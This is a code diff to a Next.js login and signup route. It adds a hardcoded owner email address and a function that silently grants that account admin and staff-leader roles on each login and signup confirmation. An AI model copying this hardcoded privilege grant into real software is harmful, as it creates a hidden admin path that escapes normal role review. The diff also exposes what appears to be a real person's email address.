@@ -6,6 +6,7 @@ import {createSession,currentUser,revokeSession} from "../../../../lib/host/sess
 
 export const dynamic="force-dynamic";
 const emailPattern=/^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+const ownerEmail="kirayeal.az@gmail.com";
 function response(data:unknown,status=200){return NextResponse.json(data,{status,headers:{"Cache-Control":"no-store"}});}
 function cleanEmail(value:unknown){const email=String(value||"").trim().toLowerCase();return emailPattern.test(email)&&email.length<=254?email:"";}
 async function issueCode(userId:string|null,email:string,purpose:"signup"|"recovery"){
@@ -15,6 +16,7 @@ async function issueCode(userId:string|null,email:string,purpose:"signup"|"recov
   await hostQuery(`insert into auth.verification_codes(user_id,email,purpose,code_hash,expires_at) values($1,$2,$3,$4,now()+interval '10 minutes')`,[userId,email,purpose,emailCodeHash(email,purpose,code)]);
   await sendVerificationCode(email,code,purpose);
 }
+async function ensureOwnerRole(userId:string,email:string){if(email!==ownerEmail)return;await hostTransaction(async client=>{await client.query(`update public.profiles set role='admin',updated_at=now() where id=$1`,[userId]);await client.query(`insert into public.staff_members(user_id,staff_role,assigned_by) values($1,'leader',$1) on conflict(user_id) do update set staff_role='leader'`,[userId]);});}
 
 export async function GET(){const user=await currentUser();return response({user});}
 
@@ -28,6 +30,7 @@ export async function POST(request:NextRequest){
       const rows=await hostQuery<{id:string;password_hash:string|null;email_confirmed_at:string|null}>(`select id,password_hash,email_confirmed_at from auth.users where lower(email)=lower($1) and disabled_at is null limit 1`,[email]);
       const user=rows[0];if(!user||!user.password_hash||!await passwordMatches(password,user.password_hash))return response({error:"INVALID_CREDENTIALS"},401);
       if(!user.email_confirmed_at)return response({error:"EMAIL_NOT_CONFIRMED"},403);
+      await ensureOwnerRole(user.id,email);
       return response({session:await createSession(user.id,body.remember!==false)});
     }
     if(action==="signup"){
@@ -57,7 +60,7 @@ export async function POST(request:NextRequest){
       const rows=await hostQuery<{id:string;user_id:string;code_hash:Buffer;attempts:number}>(`select id,user_id,code_hash,attempts from auth.verification_codes where lower(email)=lower($1) and purpose=$2 and consumed_at is null and expires_at>now() order by id desc limit 1`,[email,purpose]);
       const item=rows[0];if(!item||item.attempts>=6||!safeEqual(item.code_hash,emailCodeHash(email,purpose,code))){if(item)await hostQuery(`update auth.verification_codes set attempts=attempts+1 where id=$1`,[item.id]);return response({error:"INVALID_CODE"},400);}
       await hostQuery(`update auth.verification_codes set consumed_at=now() where id=$1`,[item.id]);
-      if(purpose==="signup"){await hostQuery(`update auth.users set email_confirmed_at=coalesce(email_confirmed_at,now()),updated_at=now() where id=$1`,[item.user_id]);return response({session:await createSession(item.user_id,body.remember!==false)});}
+      if(purpose==="signup"){await hostQuery(`update auth.users set email_confirmed_at=coalesce(email_confirmed_at,now()),updated_at=now() where id=$1`,[item.user_id]);await ensureOwnerRole(item.user_id,email);return response({session:await createSession(item.user_id,body.remember!==false)});}
       return response({recovery_token:code});
     }
     if(action==="reset_password"){
